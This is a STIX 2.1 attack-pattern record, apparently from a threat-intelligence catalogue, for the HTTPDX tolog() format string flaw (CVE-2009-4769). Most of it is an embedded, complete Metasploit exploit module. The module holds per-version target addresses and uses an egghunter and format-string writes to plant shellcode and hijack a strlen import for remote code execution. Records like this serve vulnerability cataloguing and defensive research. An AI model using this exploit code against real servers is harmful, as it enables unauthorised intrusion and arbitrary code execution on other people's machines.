{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7f97f26-0495-431f-ab9a-85f96b12c8d7",
    "created": "2024-08-14T16:55:48.16891Z",
    "modified": "2024-08-14T16:55:48.168914Z",
    "name": "HTTPDX tolog() Function Format String Vulnerability",
    "description": " This module exploits a format string vulnerability in HTTPDX HTTP server. By sending a specially crafted HTTP request containing format specifiers, an attacker can corrupt memory and execute arbitrary code.  By default logging is off for HTTP, but enabled for the 'moderator' user via FTP. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/httpdx_tolog_format.rb",
            "external_id": "httpdx_tolog_format.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4769"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Egghunter\n  include Msf::Exploit::FormatString\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTTPDX tolog() Function Format String Vulnerability',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in HTTPDX HTTP server.\n        By sending a specially crafted HTTP request containing format specifiers, an\n        attacker can corrupt memory and execute arbitrary code.\n\n        By default logging is off for HTTP, but enabled for the 'moderator' user\n        via FTP.\n      },\n      'Author'         =>\n        [\n          'jduck'    # original discovery and metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4769' ],\n          [ 'OSVDB', '60182' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # format string max length\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x25\\x2f\\x3f\\x5c\",\n          'DisableNops'\t=>  'True',\n          'StackAdjustment' \t=> -1500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #\n          # Automatic targeting via fingerprinting\n          #\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n\n          #\n          # specific targets\n          #\n          [\t'httpdx 1.4 - Windows XP SP3 English',\n            {\n              'PadBytes' \t=> 2,\n              'NumPops' \t=> 22,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.4.5 - Windows XP SP3 English',\n            {\n              'PadBytes' \t=> 2,\n              'NumPops' \t=> 22,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.4.6 - Windows XP SP3 English',\n            {\n              'PadBytes' \t=> 2,\n              'NumPops' \t=> 22,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.4.6b - Windows XP SP3 English',\n            {\n              'PadBytes' \t=> 2,\n              'NumPops' \t=> 22,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n            ],\n          [\t'httpdx 1.5 - Windows XP SP3 English',\n            {\n              'PadBytes' \t=> 2,\n              'NumPops' \t=> 22,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n\n          #\n          # Debugging target\n          #\n          [ 'Debug target',\n            {\n              'PadBytes'  => 2,\n              'NumPops'   => 22,\n              'Writable'  => 0xfeedfed5,\n              'FlowHook'  => 0xdeadbeef\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-17'))\n=begin\n\nNOTE: Even though all targets have the same addresses now, future targets may not.\n\nTo find a target:\n\n1. open \"core.dll\" in IDA Pro\n2. navigate to the \"c_wildcmp\" function\n3. follow the xref to the first strlen\n4. follow the xref to the imports area\n5. copy/paste the address\n6. the 'Writable' value should be anything after the last address IDA shows..\n (preferably something above 0x0d, to avoid bad chars)\n\nIf crashes occur referencing strange values, 'NumPops' probably needs adjusting.\nFor now, that will have to be done manually.\n\n=end\n  end\n\n\n  def check\n    version = get_version\n    if version\n      print_status(\"HTTPDX version detected : #{version}\")\n      if (version =~ /1\\.4/) or (version == \"1.5\")\n        return Exploit::CheckCode::Appears\n      end\n    end\n    Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    # an empty host header gives us 512 bytes in the client structure\n    # (the client->filereq and client->host buffers are adjacement in memory)\n    datastore['VHOST'] = ''\n\n    # Use a copy of the target\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n\n      version = get_version\n      if not version\n        fail_with(Failure::Unknown, \"The server doesn't appear to be running a vulnerable version of HTTPDX\")\n      end\n\n      re = Regexp.new(Regexp.escape(version)+' - ', Regexp::IGNORECASE)\n      self.targets.each do |t|\n        if (re.match(t.name))\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        fail_with(Failure::Unknown, 'Unable to automatically detect exploitation parameters')\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n    end\n\n    # proceed with chosen target...\n\n    # '<ip> [Tue, 17 Nov 2009 18:22:12 GMT] \"<GET/POST> /'\n    ip_length = Rex::Socket.source_address(datastore['RHOST']).length\n    num_start = ip_length + 2 + 29 + 3 + 3 + 2\n\n    # use the egghunter!\n    eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n\n    # write shellcode to 'writable' (all at once)\n    fmtbuf = generate_fmtstr_from_buf(num_start, mytarget['Writable'], eh_stub, mytarget)\n    fmtbuf = '/' + fmtbuf.gsub(/%/, '%25').gsub(/ /, '%20')\n    print_status(\" payload format string buffer is #{fmtbuf.length} bytes\")\n\n    send_request_raw({ 'uri' => fmtbuf })\n\n    # write 'writable' addr to flowhook (execute shellcode)\n    # NOTE: the resulting two writes must be done at the same time\n    fmtbuf = generate_fmt_two_shorts(num_start, mytarget['FlowHook'], mytarget['Writable'], mytarget)\n    # add payload to the end\n    fmtbuf << eh_egg\n    fmtbuf = '/' + fmtbuf.gsub(/%/, '%25').gsub(/ /, '%20')\n    print_status(\" hijacker format string buffer is #{fmtbuf.length} bytes\")\n\n    send_request_raw({ 'uri' => fmtbuf })\n    disconnect\n\n    # connect again to trigger shellcode\n    select(nil, nil, nil, 1.5)\n    print_status(\" triggering shellcode now\")\n    print_status(\"Please be patient, the egg hunter may take a while...\")\n    connect\n\n    handler\n  end\n\n\n  def get_version\n    info = http_fingerprint # Custom version extraction / automatic target\n    if info and (info =~ /httpdx\\/(.*) \\(Win32\\)/)\n      return $1\n    end\n    nil\n  end\nend\n\n\n=begin\n\nalso present in 1.5 (presumably all versions in between)\n\n1.4/httpdx_src/ftp.cpp:\n\n   544      //printf(out);\n   545      char af[MAX] = {0};\n   546      if(isset(out) && client->serve.log || client->serve.debug)\n   547          snprintf(af,sizeof(af)-1,\"%s\\n%s%s\\n\",client->addr,client->cmd,out);\n   548      if(isset(out) && client->serve.log)\n   549          tolog(client->serve.accessl,af);\n   550      if(isset(out) && client->serve.debug)\n   551          printf(af);\n\n1.4/httpdx_src/http.cpp:\n\n   172      char af[MAX] = {0};\n   173      if(client.serve.log || client.serve.debug)\n   174          snprintf(af,sizeof(af)-1,\"%s [%s] \\\"%s /%s HTTP/1.1\\\" %d\\n\",client.addr,timef,m[client.method-1],client.filereq,response.code);\n   175      if(client.serve.log)\n   176          tolog(client.serve.accessl,af);\n   177      if(client.serve.debug)\n   178          printf(af);\n\n=end\n",
    "x_mitre_disclosure_date": "2009-11-17",
    "x_mitre_platforms": [
        "win'"
    ]
}